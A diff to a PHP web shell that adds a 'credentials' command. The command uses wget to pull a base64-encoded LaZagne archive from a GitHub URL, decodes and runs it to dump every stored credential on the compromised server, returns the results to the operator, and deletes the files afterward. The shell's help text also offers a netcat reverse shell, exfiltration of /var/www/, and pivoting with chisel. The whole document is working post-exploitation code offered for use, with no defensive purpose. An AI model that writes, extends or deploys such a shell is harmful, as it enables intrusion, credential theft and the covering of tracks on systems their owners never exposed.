@@ -14,8 +14,14 @@ function featureShell($cmd, $cwd) {
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         return featureDownload($match[1]);
     } elseif (preg_match("/^\s*help\s+(.+)\s*(2>&1)?$/", $cmd)){
-        return featureHelp(); 
-    } else {
+        return featureHelp();
+    } elseif (preg_match("/^\s*credentials\s+(.+)\s*(2>&1)?$/", $cmd)){
+        return featureCredentilasDump();
+    } 
+    
+    
+    
+    else {
         chdir($cwd);
         exec($cmd, $stdout);
     }
@@ -77,6 +83,27 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function featureCredentilasDump(){
+    chdir($tmp);
+    $f = @fopen('/tmp/LaZagne.zip', 'wb');
+    if ($f === FALSE){
+        return array(
+            'stdout' => array('Invalid path / no write permission.'),
+            'cwd' => getcwd()
+        );
+    } else{
+        fclose($f);
+        exec('wget https://raw.githubusercontent.com/GeenStack/KeftemeWS/main/Modules/encoded_lazgne.txt -O /tmp/encoded.txt; cat /tmp/encoded.txt | base64 -d >> /tmp/Linux.zip; cd /tmp; unzip Linux.zip; cd Linux; python laZagne.py  all -quiet -oA;');
+        $credentials = file_get_contents('/tmp/Linux/credentials.txt');
+        exec('rm -rf /tmp/Linux /tmp/LaZagne.zip /tmp/Linux.zip /tmp/encoded.txt');
+        return array(
+            'stdout' => array($credentials),
+            'cwd' => getcwd()
+        );
+    }
+}
+
+
 function featureHelp() {
 
         $help = "
@@ -99,9 +126,9 @@ How you can usage this?
 
 8.  backconnect - simple reverse shell via netcat
 
-9.  dump_cred - attemp credentials access via LaZagne and some exploits. (Need be root. Automatic pwn attempt)
+9.  credentials - attempt credentials access via LaZagne and some exploits.
 
-10.  src_leak - exfiltrate /var/www/
+10. src_leak - exfiltrate /var/www/
 
 11. pivot - Using chisel for pivoting
 
@@ -119,7 +146,6 @@ How you can usage this?
             'stdout' => array($help),
             'cwd' => getcwd()
         );
-    
 }
 
 
